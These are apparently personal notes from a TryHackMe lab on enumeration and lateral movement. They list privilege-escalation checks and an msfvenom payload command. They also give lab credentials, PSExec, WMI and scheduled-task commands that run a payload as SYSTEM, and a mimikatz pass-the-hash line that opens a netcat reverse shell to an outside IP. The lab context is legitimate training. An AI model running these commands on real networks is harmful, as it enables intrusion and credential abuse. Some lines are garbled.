# Basic Steps

[Tyler's Notebook](https://southeasttech-my.sharepoint.com/:o:/g/personal/tyler_ramsbey_southeasttech_edu/EmrNEjx_FjRKjYRotc9TikMB7DtzCwhKWOAEovdtZADBgg?rtime=bQkHVxRr20g)

## Automatic web enum
- dirb | dirsearch
- linpeas
- wpsscan -U user -P password

## Basic network
- nmap (all ports)
  - script: locate -r nse$ | grep NAME
- nmap Scrips
  - locate -r nse$ | grep mysql = nmap script

## Linux
- sudo -l
- find / -perm -u=s -type f 2>/dev/null
- find / -type f -perm -04000 -ls 2>/dev/null 
- psexec.py
- lscpu
- lsblk -a
- lsusb -v
- lspci -t -v
- fidlist -l
  
- Shell stabilize
  -  python3 -c 'import pty;pty.spawn("/bin/bash")'
  - python3 -c  import pty;pty.spawn('/bin/bash') 
  - export TERM=xterm

## Payloads
- msfvenom - reverse -f aspx -o app.aspx

## Windows
- /priv
- systeminfo
- smb read/write
- browser cache
- scheduled task
- UAC
- Check loggings
  - sysmon enable / powershell loggging enabled ?
- echo %VARIABLE%


# Lateral Movement
tony.holland:Mhvn2334

$ ssh za.tryhackme.com\\tony.holland@thmjmp2.za.tryhackme.com


sc.exe \\thmiis.za.tryhackme.com create THMservice-3244 binPath= "%windir%\pat.exe" start=auto
THM{MOVING_WITH_SERVICES}

\\thmiis.za.tryhackme.com 

psexec64.exe \\thmiis.za.tryhackme.com -u ZA.TRYHACKME.COM\t1_leonard.summers -p EZpass4ever -i %windir%\pat.exe

psexec64.exe \\thmiis.za.tryhackme.com -u t1_leonard.summers -i %windir%\pat.exe

===
$username = 'ZA.TRYHACKME.COM\t1_leonard.summers';
$password = 'EZpass4ever';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

Enter-PSSession -Computername \\thmiis.za.tryhackme.com -Credential $credentialwho

#########
User: ZA.TRYHACKME.COM\t1_corine.waters

Password: Korine.1994

Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{Name = "pat";DisplayName = "pat";PathName = "%windir%\pat.msi";ServiceType = [byte]::Parse("16");StartMode = "Manual"}

$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'pat'"


$Command = "cmd.exe"
$Args = "%windir%\pat.msi"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "pat2" Start-ScheduledTask -CimSession $Session -TaskName "pat2"


THM{MOVING_WITH_WMI_4_FUN}


##########


sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:f461626e5bfb1c0e98e80a30630aefb2 /run:"c:\tools\nc64.exe -e cmd.exe 10.50.46.50 5555"

t1_toby.beck5\desktop\flag.exe
